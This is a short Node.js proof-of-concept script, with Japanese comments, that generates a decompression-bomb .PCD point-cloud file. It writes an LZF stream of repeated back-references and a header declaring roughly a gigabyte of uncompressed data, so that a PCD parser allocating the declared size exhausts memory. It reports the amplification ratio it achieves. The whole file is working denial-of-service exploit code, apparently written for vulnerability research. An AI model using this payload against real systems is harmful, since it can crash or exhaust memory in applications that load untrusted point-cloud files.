import { writeFileSync } from 'node:fs';
// 目標の展開サイズ（触って書き込まれるバイト数）
const target = Number(process.argv[2] || 1_000_000_000);
const out = Number(process.argv[3] || target); // 宣言 usize（既定は target と一致）
// LZF ストリーム: 先頭 1 リテラル + [0xE0,0xFF,0x00]（1 個で 264 バイトを前の 1 バイトから複製）
const RUN = 264;
const nref = Math.floor((target - 1) / RUN);
const realOut = 1 + nref * RUN; // 実際に展開されるサイズ（厳密一致が必要）
const comp = Buffer.alloc(2 + nref * 3);
let p = 0;
comp[p++] = 0x00; comp[p++] = 0x41; // リテラル 1 バイト (0x41)
for (let i = 0; i < nref; i++) { comp[p++] = 0xE0; comp[p++] = 0xFF; comp[p++] = 0x00; }
const npts = 10, stride = 12;
const header = Buffer.from(
`# .PCD v0.7
VERSION 0.7
FIELDS x y z
SIZE 4 4 4
TYPE F F F
COUNT 1 1 1
WIDTH ${npts}
HEIGHT 1
POINTS ${npts}
DATA binary_compressed
`, 'latin1');
const sz = Buffer.alloc(8);
sz.writeUInt32LE(comp.length, 0);  // csize
sz.writeUInt32LE(realOut, 4);      // usize（展開後サイズ。cap とは無関係に Uint8Array(usize) を確保）
const file = Buffer.concat([header, sz, comp]);
writeFileSync(process.argv[4] || 'poc/bomb.pcd', file);
console.log(JSON.stringify({ compressedFileBytes: file.length, declaredUsize: realOut, amplification: +(realOut/file.length).toFixed(1) }));
